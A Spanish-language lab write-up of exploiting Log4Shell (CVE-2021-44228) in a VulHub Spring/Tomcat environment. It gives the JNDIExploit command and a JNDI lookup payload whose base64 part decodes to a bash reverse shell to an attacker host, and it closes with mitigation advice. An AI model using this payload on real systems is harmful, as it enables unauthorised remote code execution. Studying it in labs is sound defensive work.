---
title: "Log4Shell (CVE-2021-44228) - VulHub"
date: 2024-08-02
description: "Explotación de Log4Shell vía JNDI/LDAP con JNDIExploit hasta RCE."
excerpt: "Endpoint /hello vulnerable a Log4Shell (CVE-2021-44228) → servidor LDAP malicioso → JNDI lookup → RCE."
platform: "VulnHub"
difficulty: "Easy"
image: "/images/vulnhub.svg"
tags:
  - "Log4Shell"
  - "CVE-2021-44228"
  - "JNDI"
  - "LDAP"
  - "RCE"
  - "Java"
---

Log4Shell (CVE-2021-44228) fue una de las vulnerabilidades más críticas de la historia reciente: un simple string logueado por Log4j2 podía provocar ejecución remota de código. Este laboratorio de VulHub la reproduce en un servicio Spring/Tomcat.

**Servicios:** `22` SSH · `38080` Tomcat + Spring (servicio de logging)

## 1. Descubrimiento del endpoint

`dirsearch` revela `/hello`. Con GET responde que no está soportado, pero un **POST** devuelve OK — y ese input termina siendo procesado por Log4j2.

## 2. Servidor LDAP malicioso

Levantamos un servidor JNDI/LDAP que servirá la clase Java a ejecutar:

```bash
java -jar JNDIExploit-1.2.SNAPSHOT.jar -i <ATK_IP>
```

## 3. Payload Log4Shell

Enviamos el payload JNDI con el comando en base64 (reverse shell):

```
${jndi:ldap://<ATK>:1389/TomcatBypass/Command/Base64/L2Jpbi9iYXNoID4mIC9kZXYvdGNwLzxBVEs+Lzc3NzcgMD4mMQ==}
```

Log4j resuelve el lookup JNDI, descarga la clase desde nuestro LDAP y la ejecuta → **reverse shell**.

## Conceptos aplicados

- **CVE-2021-44228 (Log4Shell)**: JNDI lookup dentro de un string logueado.
- Carga remota de clases Java vía LDAP → RCE.
- Uso de `JNDIExploit` para automatizar el servidor malicioso.

> Nota defensiva: mitigar con `log4j2.formatMsgNoLookups=true`, actualizar a Log4j ≥ 2.17.1 y filtrar egress hacia LDAP/RMI.
